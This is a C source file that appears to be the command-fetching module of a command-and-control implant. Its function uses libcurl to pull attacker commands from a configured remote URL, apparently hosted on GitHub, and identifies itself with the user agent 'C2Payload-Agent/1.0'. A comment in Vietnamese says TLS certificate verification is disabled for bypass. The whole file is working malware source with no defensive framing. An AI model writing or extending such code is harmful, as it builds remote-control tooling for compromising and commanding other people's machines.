#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <curl/curl.h>
#include "command_fetch.h"
#include "config.h"

struct string {
    char *ptr;
    size_t len;
};

void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(1);
    if (s->ptr) {
        s->ptr[0] = '\0';
    } else {
        fprintf(stderr, "[!] Failed to allocate memory for response buffer.\n");
    }
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    struct string *s = (struct string *)userdata;
    char *new_ptr = realloc(s->ptr, s->len + total + 1);
    if (!new_ptr) return 0;

    s->ptr = new_ptr;
    memcpy(s->ptr + s->len, ptr, total);
    s->len += total;
    s->ptr[s->len] = '\0';

    return total;
}

bool fetch_command_from_github(char *buffer) {
    CURL *curl;
    CURLcode res;
    struct string s;

    init_string(&s);
    if (!s.ptr) return false;

    curl = curl_easy_init();
    if (!curl) {
        free(s.ptr);
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_URL, C2_COMMAND_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "C2Payload-Agent/1.0");
    curl_easy_setopt(curl, CURLOPT_CAINFO, "C:/curl/cacert.pem");

    // Optional: nếu có chứng chỉ thì bật, không thì bỏ qua verify (dành cho bypass)
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    // Nếu bạn có file chứng chỉ thì có thể dùng dòng này thay:
    // curl_easy_setopt(curl, CURLOPT_CAINFO, "C:/curl/cacert.pem");

    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK && s.len > 0) {
        strncpy(buffer, s.ptr, 1023);
        buffer[1023] = '\0';
        free(s.ptr);
        return true;
    }

    fprintf(stderr, "[x] CURL failed: %s\n", curl_easy_strerror(res));
    free(s.ptr);
    return false;
}
